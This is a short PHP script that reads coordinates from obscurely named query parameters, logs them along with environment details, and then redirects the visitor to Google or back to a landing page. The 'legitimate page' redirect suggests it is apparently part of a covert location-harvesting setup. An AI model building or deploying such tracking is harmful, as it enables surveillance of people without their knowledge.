<?php
/**
 * location_forwarder.php
 * 
 * Validates lat/lon, logs geolocation, then redirects to a legitimate page or back to landing.
 */

require_once __DIR__ . '/logger.php';

// Log environment info
logEnvironment();

if (isset($_GET['x']) && isset($_GET['y'])) {
    $lat = (float)$_GET['x'];
    $lon = (float)$_GET['y'];

    if (isValidCoordinates($lat, $lon)) {
        logGeolocation($lat, $lon);
        // Redirect to an external page (e.g. Google) or a "success" page
        header('Location: https://www.google.com/');
        exit;
    }
}

// If invalid or missing lat/lon, go back to landing
header('Location: landing.php');
exit;

function isValidCoordinates(float $lat, float $lon): bool
{
    return ($lat >= -90 && $lat <= 90) && ($lon >= -180 && $lon <= 180);
}
